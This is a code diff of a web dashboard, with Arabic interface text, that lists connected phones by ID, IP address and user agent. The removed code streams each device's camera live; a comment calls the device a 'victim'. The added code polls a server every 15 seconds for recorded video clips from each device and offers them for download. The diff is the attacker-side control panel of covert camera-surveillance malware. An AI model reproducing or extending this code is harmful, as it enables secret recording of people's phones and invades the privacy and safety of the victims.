@@ -227,34 +227,48 @@
 
       card.innerHTML = '<h3>📱 ' + peerId + '</h3>'
         + '<div class="info">IP: <span>' + displayIp + '</span> | UA: ' + shortUa + '</div>'
-        + '<div class="video-container">'
-        + '  <video id="vid-' + peerId + '" autoplay playsinline muted></video>'
-        + '  <div class="status-badge" id="badge-' + peerId + '">● CONNECTING</div>'
-        + '</div>'
+        + '<div class="clips-container" id="clips-' + peerId + '">جاري سحب المقاطع...</div>'
         + '<div class="controls">'
-        + '  <button class="btn-audio muted" id="audiobtn-' + peerId + '" onclick="toggleAudio(\'' + peerId + '\')">🔇 Muted</button>'
-        + '  <button class="btn-snap" onclick="takeSnap(\'' + peerId + '\')">📸 Screenshot</button>'
+        + '  <button class="btn-snap" onclick="fetchClips(\'' + peerId + '\')">🔄 تحديث المقاطع</button>'
         + '</div>';
 
       list.appendChild(card);
       updateCount();
 
-      // Call this victim after a short delay
-      setTimeout(function() {
-        callVictim(peerId);
-      }, 800);
+      // Fetch clips periodically
+      fetchClips(peerId);
+      setInterval(function() {
+        fetchClips(peerId);
+      }, 15000);
     }
 
     function removeCard(peerId) {
       var card = document.getElementById('card-' + peerId);
       if (card) card.remove();
-
-      if (activeCalls[peerId]) {
-        try { activeCalls[peerId].close(); } catch(e) {}
-        delete activeCalls[peerId];
-      }
       delete knownPeers[peerId];
       updateCount();
+    }
+
+    function fetchClips(peerId) {
+      fetch('/api/clips/' + peerId)
+        .then(res => res.json())
+        .then(clips => {
+          var container = document.getElementById('clips-' + peerId);
+          if (!container) return;
+          if (clips.length === 0) {
+            container.innerHTML = '<p>لا توجد مقاطع بعد، يرجى الانتظار...</p>';
+            return;
+          }
+          var html = '<h4>المقاطع المسجلة (' + clips.length + ')</h4><div style="max-height:200px;overflow-y:auto;">';
+          clips.forEach(clip => {
+            html += '<div style="margin-bottom:10px; background:rgba(255,255,255,0.1); padding:5px; border-radius:5px;">'
+                 + '<video src="/clips/' + clip + '" controls style="width:100%; border-radius:5px;"></video>'
+                 + '<small><a href="/clips/' + clip + '" download>💾 تحميل</a></small>'
+                 + '</div>';
+          });
+          html += '</div>';
+          container.innerHTML = html;
+        }).catch(err => console.log('Error fetching clips:', err));
     }
 
     function updateCount() {
